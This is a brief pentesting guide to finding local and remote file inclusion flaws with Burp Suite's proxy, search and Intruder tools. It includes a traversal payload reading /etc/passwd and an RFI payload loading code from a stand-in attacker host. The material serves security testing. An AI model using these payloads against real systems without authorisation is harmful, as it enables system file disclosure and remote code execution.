use Burp Suite to search for these keywords or patterns 

1. **Intercepting Traffic**:
   - Use Burp Suite’s proxy to intercept and inspect HTTP requests and responses between your browser and the web application.
   - Look for parameters in the URLs or form data that include file paths or URLs (e.g., `page`, `file`, `template`).

2. **Searching in Burp Suite**:
   - Go to the "Search" tab in Burp Suite.
   - Input search terms related to file inclusion, such as `page=`, `file=`, `template=`, or common path traversal strings like `../`.
   - Look through the requests and responses for these terms to find potential vulnerabilities.

3. **Testing for Vulnerabilities**:
   - Once you identify parameters that might be vulnerable, manually test them by modifying the input to include common LFI or RFI payloads.
   - For LFI, you might test inputs like `../../../../../etc/passwd`.
   - For RFI, you might test inputs like `http://attacker.com/malicious.php`.

4. **Using Burp Intruder**:
   - Automate the testing by using Burp Intruder to inject payloads into the identified parameters systematically.
